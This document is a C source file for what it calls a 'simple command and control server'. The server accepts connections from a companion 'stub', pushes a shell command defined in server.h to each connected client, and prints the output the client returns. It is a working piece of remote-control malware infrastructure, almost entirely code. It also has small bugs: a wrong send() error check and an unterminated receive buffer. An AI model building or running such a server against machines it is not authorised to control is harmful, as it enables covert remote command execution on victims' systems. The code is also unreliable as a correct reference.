// Executable name   : server
// Version           : 1.0
// Created date      : 19.06.24
// Last updated      : 19.06.24
// Author            : 0x6x6d
// Architecture      : x64
// Platform          : Unix
// Description       : Simple command and control server
//
// use program
// terminal 1: ./server
// termianl 2: ./stub
// > see the response from the command executed on the client in the terminal console
// > change the command in the server.h file
//

#include "server.h"

int main() {
  // -- SPIN UP THE SERVER --
  int clients_size = 0;
  int fd_sock_server;
  struct addrinfo hints;
  struct addrinfo *result;

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;
  (void)getaddrinfo(0, PORT, &hints, &result);

  fd_sock_server =
      socket(result->ai_family, result->ai_socktype, result->ai_protocol);
  if (fd_sock_server == -1) {
    fprintf(stderr, "[e] socket() failed: %d\n", errno);
    return 1;
  }

  if (bind(fd_sock_server, result->ai_addr, result->ai_addrlen)) {
    fprintf(stderr, "[e] bind() failed: %d\n", errno);
    return 1;
  }

  freeaddrinfo(result);

  if (listen(fd_sock_server, 10) == -1) {
    fprintf(stderr, "[e] listen() failed: %d\n", errno);
    return 1;
  }

  // -- MONITORING FILE DESCRIPTORS --
  int event_count;
  // event: interest list (fd that will be monitored)
  // events: ready list (set of fd that are ready for I/O)
  struct epoll_event event, events[MAX_EVENTS];

  // create fd for epoll
  int fd_epoll = epoll_create1(0);
  if (fd_epoll == -1) {
    fprintf(stderr, "[e] epoll_create1() failed: %d", errno);
    return 1;
  }

  // add server socket fd to the interest list
  event.events = EPOLLIN;         // listen for incoming connections
  event.data.fd = fd_sock_server; // associate event with server socket fd
  if (epoll_ctl(fd_epoll, EPOLL_CTL_ADD, fd_sock_server, &event) == -1) {
    fprintf(stderr, "[e] epoll_ctl() failed: %d\n", errno);
    return 1;
  }

  printf("[i] Waiting for incoming connections...\n");

  // continous monitoring of fd
  for (;;) {
    // fill the ready list with a max. of MAX_EVENTS events
    event_count = epoll_wait(fd_epoll, events, MAX_EVENTS, -1);
    if (event_count == -1) {
      fprintf(stderr, "[e] epoll_wait() failed: %d\n", errno);
      return 1;
    }

    // iterate over each event that is ready
    for (int i = 0; i < event_count; ++i) {
      // if the event is the server socket fd then a new client is trying to
      // connect
      if (events[i].data.fd == fd_sock_server) {
        struct sockaddr_storage addr_client;
        socklen_t client_addr_len = sizeof(addr_client);

        // accepting the client
        int fd_sock_client = accept(
            fd_sock_server, (struct sockaddr *)&addr_client, &client_addr_len);
        if (fd_sock_client == -1) {
          fprintf(stderr, "[e] accept() failed: %d\n", errno);
          return 1;
        }

        // set the client socket fd to non-blocking
        if (fd_set_nonblocking(fd_sock_client) == -1) {
          fprintf(stderr, "[e] fd_set_nonblocking() failed: %d\n", errno);
          continue;
        }

        // EPOLLIN = app will be notified when data is available to read from
        // the fd
        // EPOLLOUT = app will be notified when the fd is ready to accept
        // write operations
        // EPOLLET = set edge-triggered mode -> app is only
        // notified when state of fd changes
        event.events = EPOLLIN | EPOLLOUT | EPOLLET;
        event.data.fd = fd_sock_client;
        // add client socket fd to the interest list
        if (epoll_ctl(fd_epoll, EPOLL_CTL_ADD, fd_sock_client, &event) == -1) {
          fprintf(stderr, "[e] epoll_ctl() EPOLL_CTL_ADD failed: %d\n", errno);
          continue;
        }

        // write info msg for the new connection
        char client_addr_buffer[100];
        getnameinfo((struct sockaddr *)&addr_client, client_addr_len,
                    client_addr_buffer, sizeof(client_addr_buffer), 0, 0,
                    NI_NUMERICHOST);
        printf("[i] new connection from: %s\n", client_addr_buffer);
      }
      // read data from already connected clients
      else if (events[i].events & EPOLLIN) {
        char read[BUFFER_SIZE];
        int bytes_recv = recv(events[i].data.fd, read, BUFFER_SIZE, 0);

        if (bytes_recv == -1) {
          fprintf(stderr, "[e] recv() failed: %d\n", errno);
          continue;
        }

        // receiving 0 bytes means the connection was closed by the client
        if (bytes_recv == 0) {
          // removing client from interest list
          if (epoll_ctl(fd_epoll, EPOLL_CTL_DEL, events[i].data.fd, &event) ==
              -1) {
            fprintf(stderr, "[e] epoll_ctl() EPOLL_CTL_DEL failed: %d\n",
                    errno);
            continue;
          }

          printf("[i] client closed connection: epoll_ctl() EPOLL_CTL_DEL "
                 "successfull\n");

          // change client status

        } else {
          printf("[i] client response: %s\n", read);
        }
      }
      // send data to already connected clients
      else if (events[i].events & EPOLLOUT) {
        int bytes_send = send(events[i].data.fd, COMMAND, strlen(COMMAND), 0);
        if (bytes_send == 1) {
          fprintf(stderr, "[e] send() failed: %d\n", errno);
          continue;
        }

        printf("[i] send() success: shell command -> %s\n", COMMAND);
      }
    }
  }

  return 0;
}

// -- HELPER FUNCTIONS --
int fd_set_nonblocking(int fd) {
  // get current flags
  int flags = fcntl(fd, F_GETFL, 0);
  if (flags == -1) {
    return 1;
  }

  flags |= O_NONBLOCK;
  return fcntl(fd, F_SETFL, flags);
}
